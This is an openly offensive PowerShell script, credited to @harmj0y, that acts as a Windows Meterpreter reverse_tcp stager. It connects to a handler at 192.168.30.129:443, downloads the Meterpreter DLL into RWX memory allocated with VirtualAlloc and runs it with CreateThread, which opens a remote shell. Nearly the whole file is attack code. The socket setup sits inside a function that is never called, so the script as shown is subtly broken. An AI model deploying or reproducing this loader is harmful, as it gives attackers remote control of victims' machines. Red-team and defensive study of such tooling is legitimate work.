#
# PowerShell windows/meterpreter/reverse_tcp stager 
#   (doesn't rely on shellcode)
#
# Original inspiration: https://github.com/rsmudge/metasploit-loader
#
# By: @harmj0y
#

# import/expose the necessary Windows system .dlls
$code = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
"@

function getData {
    # create the socket and connect to our handler
    $socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
    $socket.Connect('192.168.30.129', 443) | out-null
}

$payloadSizeBuf = [Array]::CreateInstance("byte", 4)

# read in the payload size
$x = $socket.Receive($payloadSizeBuf) | out-null
# convert the payload byte array to an integer
$payloadSize = [BitConverter]::ToInt32($payloadSizeBuf,0)

$Shellcode = [Array]::CreateInstance("byte", $payloadSize+5)

$receivedBytes = 0
# read ALL of the meterpreter.dll into the appropriate position in the buffer
while ($receivedBytes -lt $payloadSize) { $receivedBytes += $socket.Receive($Shellcode,$receivedBytes+5,32,[System.Net.Sockets.SocketFlags]::None) }

# assembly magic that pushes the socket number to edi
$Shellcode[0] = 0xBF

# convert the socket handle to hex so we can throw it into the blob
$handleBuf = [System.BitConverter]::GetBytes([int]$socket.Handle)

# copy the byte array containing the socket handle into the blob
for ($i=1; $i -le 4; $i++) {$Shellcode[$i] = $handleBuf[$i-1]}

$ptr = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru

# standard virtualalloc/copy/create thread pattern
$x=$ptr::VirtualAlloc(0,$Shellcode.Length,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, [IntPtr]($x.ToInt32()), $Shellcode.Length)
$ptr::CreateThread(0,0,$x,0,0,0) | out-null

# sleep for 24 hours
Start-Sleep -Second 86400
